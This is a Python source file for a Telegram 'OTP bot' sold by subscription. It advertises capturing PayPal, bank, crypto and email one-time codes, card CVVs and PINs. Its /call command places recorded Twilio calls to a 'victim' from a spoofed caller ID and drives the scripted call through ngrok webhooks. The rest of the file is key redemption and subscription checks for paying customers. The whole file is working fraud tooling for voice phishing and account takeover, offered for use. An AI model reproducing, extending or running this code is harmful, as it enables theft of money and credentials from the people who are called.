from library import *
from info import *
from connection import *
from webhook_calls import *
from functions import *

# start function command

@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id
    
    if '-' in str(chat_id):
        bot.send_message(chat_id, "⛔️ You Can't Use This Bot in Group")
        print(f'{Fore.YELLOW}{chat_id} :{Fore.RED} USE BOT IN GROUP')
    elif users.find_one({'_id': chat_id}):
        print(f'{Fore.YELLOW}{chat_id} :{Fore.BLUE} CLICKED START')
        bot.send_message(chat_id, '''♫ 1XSEC OTP BOT ♫ - Owner: @xse_c\n\n👤 User Commands\n\n🔐 ➤ /redeem - Redeem your key\n⏰ ➤ /checktime - (Check Subscription Remaining Time)\n☎️ ➤ /phonelist - (show spoof numbers)\n\n📞 Call Commands\n\n💸 ➤ /paypal - Capture PayPal OTP\n💸 ➤ /call - Capture Any OTP\n💸 ➤ /cvv - Capture Any Bank CARD CVV\n💸 ➤ /crypto - Capture Any crypto purchase otp\n💸 ➤ /pin - Capture Any code pin\n💸 ➤ /email - Capture Any otp from mail\n💸 ➤ /amazon - approve link\n💸 ➤ /bank - Capture Bank OTP\n💸 ➤ /call2 - Advanced call script\n💸 ➤ /cvv2 - Advanced cvv script''')
    else:
        print(f'{Fore.YELLOW}{chat_id} :{Fore.BLUE} CLICKED START')
        print(f'{Fore.BLUE}NEW USER JOINED : {Fore.YELLOW} {chat_id}')
        current_time = int(round(time.time() * 1000))
        data = {
            'joined_date': current_time,
            '_id': chat_id,
            'plan': 'No Plan',
            'type': 'user',
            'plan_start': 0,
            'plan_end': 0
        }
        users.insert_one(data)
        bot.send_message(chat_id, '''♫ 1XSEC OTP BOT ♫ - Owner: @xse_c\n\n👤 User Commands\n\n🔐 ➤ /redeem - Redeem your key\n⏰ ➤ /checktime - (Check Subscription Remaining Time)\n☎️ ➤ /phonelist - (show spoof numbers)\n\n📞 Call Commands\n\n💸 ➤ /paypal - Capture PayPal OTP\n💸 ➤ /call - Capture Any OTP\n💸 ➤ /cvv - Capture Any Bank CARD CVV\n💸 ➤ /crypto - Capture Any crypto purchase otp\n💸 ➤ /pin - Capture Any code pin\n💸 ➤ /email - Capture Any otp from mail\n💸 ➤ /amazon - approve link\n💸 ➤ /bank - Capture Bank OTP\n💸 ➤ /call2 - Advanced call script\n💸 ➤ /cvv2 - Advanced cvv script''')
        

@bot.message_handler(commands=['generate_key'])
def generate(message):
    chat_id = message.chat.id

    if "-" in str(chat_id):
        bot.send_message(message.chat.id, "⛔️ You Can't Use This Bot in Group")
        print(f'{Fore.YELLOW}{chat_id} :{Fore.RED} USE BOT IN GROUP')
    elif users.find_one({'_id': chat_id}):
        typee = users.find_one({'_id': chat_id})['type']
        if str(typee) == 'user':
            bot.send_message(message.chat.id, "⛔️ You don't have access to do this!)")
            print(f'{Fore.RED}{chat_id} :{Fore.RED} TRY TO USE ADMIN FUNCTION')
        elif str(typee) == 'admin':
            text = message.text
            commands = text.split(' ')
            if len(commands) == 5:
                days = commands[1]
                hours = commands[2]
                minutes = commands[3]
                seconds = commands[4]

                plan = dhms_to_ms(int(days),int(hours),int(minutes),int(seconds))
                code = generate_key()
                linked = 'No Account'
                key_data = {
                    '_id': code,
                    'key': code,
                    'plan': plan,
                    'linked': linked
                }
                keys.insert_one(key_data)
                msg = generate_msg(int(days),int(hours),int(minutes),int(seconds),code,linked)
                bot.send_message(message.chat.id, msg)
                print(f'{Fore.YELLOW}{chat_id} :{Fore.BLUE} ADMIN GENERATE NEW KEY : {Fore.GREEN}{code} : {Fore.MAGENTA} {days} days {hours} hours {minutes} minutes {seconds} seconds ')
            else:
                bot.send_message(message.chat.id, "⛔️ Invalid command. Use '/generate_key <days> <hours> <minutes> <seconds>' to generate a key.")
                print(f'{Fore.YELLOW}{chat_id} :{Fore.RED} INVALID COMMAND')


@bot.message_handler(commands=['redeem'])
def delete_key(message):
    chat_id = message.chat.id

    if "-" in str(chat_id):
        bot.send_message(message.chat.id, "⛔️ You Can't Use This Bot in Group")
        print(f'{Fore.YELLOW}{chat_id} :{Fore.RED} USE BOT IN GROUP')
    elif users.find_one({'_id': chat_id}):
        text = message.text
        commands = text.split(' ')
        if len(commands) == 2:
            key = commands[1]
            if keys.find_one({'key': key}):
                linked = keys.find_one({'key': key})['linked']
                if str(linked) == 'No Account':
                    key_plan = keys.find_one({'key': key})['plan']
                    user_plan = users.find_one({'_id': chat_id})['plan']
                    
                    if str(user_plan) == 'No Plan':
                        current_time = int(round(time.time() * 1000))
                        data = {
                            'plan': key_plan,
                            'plan_start': current_time,
                            'plan_end': int(current_time)+int(key_plan),
                        }
                        keys.update_one({'_id': key}, {"$set": {'linked': chat_id}})
                        users.update_one({'_id': chat_id}, {"$set": data})
                        days, hours, minutes, seconds = ms_to_dhms(key_plan)
                        msg = redeem_msg(days, hours, minutes, seconds,key)
                        print(f'{Fore.YELLOW}{chat_id} :{Fore.BLUE} REDEEMED KEY : {Fore.MAGENTA}{key}')
                        bot.send_message(chat_id, msg)
                        bot.send_message(5439204313, f'{msg}\n  |   By @{message.from_user.username}')
                    else:
                        current_time = int(round(time.time() * 1000))

                        plan_start = users.find_one({'_id': chat_id})['plan_start']

                        left_time = (int(plan_start)+int(user_plan))-int(current_time)
                        if left_time == 0 or left_time < 0:
                            current_time = int(round(time.time() * 1000))
                            data = {
                                'plan': key_plan,
                                'plan_start': current_time,
                                'plan_end': int(current_time)+int(key_plan),
                            }
                            keys.update_one({'_id': key}, {"$set": {'linked': chat_id}})
                            users.update_one({'_id': chat_id}, {"$set": data})
                            days, hours, minutes, seconds = ms_to_dhms(key_plan)
                            msg = redeem_msg(days, hours, minutes, seconds,key)
                            print(f'{Fore.YELLOW}{chat_id} :{Fore.BLUE} REDEEMED KEY : {Fore.MAGENTA}{key}')
                            bot.send_message(chat_id, msg)
                            bot.send_message(5439204313, f'{msg}\n  |   By @{message.from_user.username}')
                        else:
                            user_plan = users.find_one({'_id': chat_id})['plan']
                            plan_end = users.find_one({'_id': chat_id})['plan_end']
                            plan = int(user_plan)+int(key_plan)
                            data = {
                                'plan': plan,
                                'plan_end': int(plan_end)+int(key_plan),
                            }
                            keys.update_one({'_id': key}, {"$set": {'linked': chat_id}})
                            users.update_one({'_id': chat_id}, {"$set": data})
                            days, hours, minutes, seconds = ms_to_dhms(key_plan)
                            msg = redeem_msg(days, hours, minutes, seconds,key)
                            print(f'{Fore.YELLOW}{chat_id} :{Fore.BLUE} REDEEMED KEY : {Fore.MAGENTA}{key}')
                            bot.send_message(chat_id, msg)
                            bot.send_message(5439204313, f'{msg}\n  |   By @{message.from_user.username}')
                else:
                    bot.send_message(message.chat.id, "⛔️ Invalid or expired key")
                    print(f'{Fore.YELLOW}{chat_id} :{Fore.RED} REDEEMED KEY ERROR INVALID OR EXPIRED KEY')
            else:
                bot.send_message(message.chat.id, "⛔️ Invalid or expired key")
                print(f'{Fore.YELLOW}{chat_id} :{Fore.RED} REDEEMED KEY ERROR INVALID OR EXPIRED KEY')
        else:
            bot.send_message(message.chat.id, "⛔️ Invalid command. Use '/redeem <key>' to redeem a key.")
            print(f'{Fore.YELLOW}{chat_id} :{Fore.RED} INVALID COMMAND')


@bot.message_handler(commands=['checktime'])
def delete_key(message):
    chat_id = message.chat.id

    if "-" in str(chat_id):
        bot.send_message(message.chat.id, "⛔️ You Can't Use This Bot in Group")
        print(f'{Fore.YELLOW}{chat_id} :{Fore.RED} USE BOT IN GROUP')
    elif users.find_one({'_id': chat_id}):
        user_plan = users.find_one({'_id': chat_id})['plan']

        if str(user_plan) == 'No Plan':
            bot.send_message(message.chat.id, "⛔️ Your don't have a subscription. Contact the developer to subscribe [ @xse_c ]")
            print(f'{Fore.YELLOW}{chat_id} :{Fore.RED} CHECKTIME FUNCTION ERROR NO SUBSCRIPTION')
        else:

            current_time = int(round(time.time() * 1000))

            plan_start = users.find_one({'_id': chat_id})['plan_start']

            user_plan = users.find_one({'_id': chat_id})['plan']

            left_time = (int(plan_start)+int(user_plan))-int(current_time)
            if left_time == 0 or left_time < 0:
                bot.send_message(message.chat.id, "⛔️ Your subscription has expired. Contact the developer to subscribe again [ @xse_c ]")
                data = {
                    'plan': 'No Plan',
                    'plan_start': 0,
                    'plan_end': 0,
                }
                users.update_one({'_id': chat_id}, {"$set": data})
                print(f'{Fore.YELLOW}{chat_id} :{Fore.RED} CHECKTIME FUNCTION ERROR NO SUBSCRIPTION')
            else:
                days, hours, minutes, seconds = ms_to_dhms(left_time)
                msg = checktime_msg(days, hours, minutes, seconds,user_plan)
                bot.send_message(chat_id, msg)
                print(f'{Fore.YELLOW}{chat_id} :{Fore.BLUE} CHECKTIME FUNCTION')
                

@bot.message_handler(commands=['phonelist'])
def phonelist(message):
    chat_id = message.chat.id

    if "-" in str(chat_id):
        bot.send_message(message.chat.id, "⛔️ You Can't Use This Bot in Group")
        print(f'{Fore.YELLOW}{chat_id} :{Fore.RED} USE BOT IN GROUP')
    elif users.find_one({'_id': chat_id}):
        user_plan = users.find_one({'_id': chat_id})['plan']

        if str(user_plan) == 'No Plan':
            bot.send_message(message.chat.id, "⛔️ Your don't have a subscription. Contact the developer to subscribe [ @xse_c ]")
            print(f'{Fore.YELLOW}{chat_id} :{Fore.RED} PHONELIST FUNCTION ERROR NO SUBSCRIPTION')
        else:

            current_time = int(round(time.time() * 1000))

            plan_start = users.find_one({'_id': chat_id})['plan_start']

            user_plan = users.find_one({'_id': chat_id})['plan']

            left_time = (int(plan_start)+int(user_plan))-int(current_time)
            if left_time == 0 or left_time < 0:
                bot.send_message(message.chat.id, "⛔️ Your subscription has expired. Contact the developer to subscribe again [ @xse_c ]")
                data = {
                    'plan': 'No Plan',
                    'plan_start': 0,
                    'plan_end': 0,
                }
                users.update_one({'_id': chat_id}, {"$set": data})
                print(f'{Fore.YELLOW}{chat_id} :{Fore.RED} PHONELIST FUNCTION ERROR NO SUBSCRIPTION')
            else:
                try:
                    # Fetch all phone numbers from the spoofdb collection
                    phone_numbers = spoof_db.find({}, {"phone": 1, "_id": 0})  # Only fetch the "phone" field

                    # Extract phone numbers from the cursor
                    formatted_text = ', '.join(str(doc["phone"]) for doc in phone_numbers if doc.get("phone"))

                    # Send the list of phone numbers to the user
                    bot.send_message(message.chat.id, f"Our Phone Numbers: {formatted_text}")
                    print(f'{Fore.YELLOW}{chat_id} :{Fore.BLUE} PHONELIST FUNCTION')
                except Exception as e:
                    bot.send_message(message.chat.id, f"An error occurred: {e}")
                    print(f'{Fore.RED}{chat_id} :{Fore.BLUE} PHONELIST FUNCTION ERROR')
                    

@bot.message_handler(commands=['call'])
def generate(message):
    chat_id = message.chat.id

    # Check if the bot is used in a group
    if "-" in str(chat_id):
        bot.send_message(message.chat.id, "⛔️ You Can't Use This Bot in Group")
        print(f'{Fore.YELLOW}{chat_id} :{Fore.RED} USE BOT IN GROUP')
        return

    # Check if the user exists in the database
    user = users.find_one({'_id': chat_id})
    if not user:
        bot.send_message(message.chat.id, "⛔️ You are not registered. Contact the developer to subscribe [ @xse_c ]")
        print(f'{Fore.YELLOW}{chat_id} :{Fore.RED} CALL FUNCTION ERROR USER NOT FOUND')
        return

    # Check if the user has a subscription
    user_plan = user.get('plan')
    if str(user_plan) == 'No Plan':
        bot.send_message(message.chat.id, "⛔️ You don't have a subscription. Contact the developer to subscribe [ @xse_c ]")
        print(f'{Fore.YELLOW}{chat_id} :{Fore.RED} CALL FUNCTION ERROR NO SUBSCRIPTION')
        return

    # Check if the subscription has expired
    current_time = int(round(time.time() * 1000))
    plan_start = user.get('plan_start', 0)
    user_plan_duration = user.get('plan', 0)
    left_time = (int(plan_start) + int(user_plan_duration)) - int(current_time)

    if left_time <= 0:
        bot.send_message(message.chat.id, "⛔️ Your subscription has expired. Contact the developer to subscribe again [ @xse_c ]")
        print(f'{Fore.YELLOW}{chat_id} :{Fore.RED} CALL FUNCTION ERROR SUBSCRIPTION EXPIRED')

        # Update the user's plan to "No Plan"
        users.update_one(
            {'_id': chat_id},
            {"$set": {'plan': 'No Plan', 'plan_start': 0, 'plan_end': 0}}
        )
        return

    # Parse the command arguments
    text = message.text
    commands = text.split(' ')
    if len(commands) != 6:
        bot.send_message(message.chat.id, "⛔️ Please Use This Format: /call number spoofnumber service name digits")
        print(f'{Fore.YELLOW}{chat_id} :{Fore.RED} INCORRECT COMMAND')
        return

    number = commands[1]
    spoof = int(commands[2])  # Ensure spoof is an integer
    service = str(commands[3])
    name = str(commands[4])
    digit = commands[5]

    # Check if the spoof number exists in the database
    spoofdb = spoof_db.find_one({"phone": spoof})
    if not spoofdb:
        bot.send_message(message.chat.id, "▪ Your spoof number is incorrect!\n\n🡢 /phonelist")
        print(f'{Fore.YELLOW}{chat_id} :{Fore.RED} SPOOF NUMBER INCORRECT')
        return

    try:
        # Check if there is an ongoing call for the user
        calls = calls_db.find_one({'_id': chat_id})
        if calls and calls.get('status') != 'ended':
            bot.send_message(message.chat.id, "⛔️ Please wait until the previous call ends")
            print(f'{Fore.YELLOW}{chat_id} :{Fore.RED} WAIT UNTIL THE PREVIOUS CALL ENDED')
            return

        # Make the call
        print(f'{Fore.YELLOW}{chat_id} :{Fore.BLUE} IS TRYING TO CALL')
        
        call = twilio_client.calls.create(record=True,
           status_callback=f'{ngrok_url}/statuscallback/{number}/{spoof}/{service}/{name}/{digit}/{chat_id}',
           recording_status_callback=f'{ngrok_url}/details_rec/{number}/{spoof}/{service}/{name}/{digit}/{chat_id}',
           status_callback_event=['ringing', 'answered', 'completed'],
           url=f'{ngrok_url}/call/{number}/{spoof}/{service}/{name}/{digit}/{chat_id}',
           to=number,
           from_=spoof,
           timeout=30,
           machine_detection='Enable')

        # Update call status to "created"
        calls_db.update_one(
            {'_id': chat_id},
            {"$set": {'status': 'created', 'call_control_id': call.sid}},
            upsert=True  # Insert if not exists
        )
        print(f'{Fore.YELLOW}{chat_id} :{Fore.BLUE} CALL CREATED')

        # Send confirmation message to the user
        bot.send_message(message.chat.id, f'''✅ CALL CREATED :
 ├  VICTIM  : {number} 
 ├  SPOOF   : {spoof}
 ├  Name    : {name.replace('-', ' ')}
 ├  SERVICE : {service}
 └  DIGITS  : {digit}''')

        # Save recall data
        recall_db.update_one(
            {'_id': chat_id},
            {"$set": {
                'command': 'call',
                'service': service,
                'spoof': spoof,
                'number': number,
                'name': name,
                'digits': digit
            }},
            upsert=True  # Insert if not exists
        )

    except Exception as e:
        # Update call status to "ended" in case of an error
        calls_db.update_one(
            {'_id': chat_id},
            {"$set": {'status': 'ended', 'call_control_id': 'None'}},
            upsert=True  # Insert if not exists
        )

        bot.send_message(message.chat.id, f"▪ Error Has Occurred!\n\n🡢 Your command is incorrect / Bot Is Down\n🡢 /call number spoofnumber service name digits")
        print(f'{Fore.YELLOW}{chat_id} :{Fore.RED} ERROR FUNCTION / BOT DOWN : {e}')
        
@bot.message_handler(commands=['fix'])
def fix(message):
    chat_id = message.chat.id
    calls_db.update_one({'_id': chat_id}, {"$set": {'status': 'ended'}}, upsert=True)
    bot.send_message(chat_id, "✅ Fixed")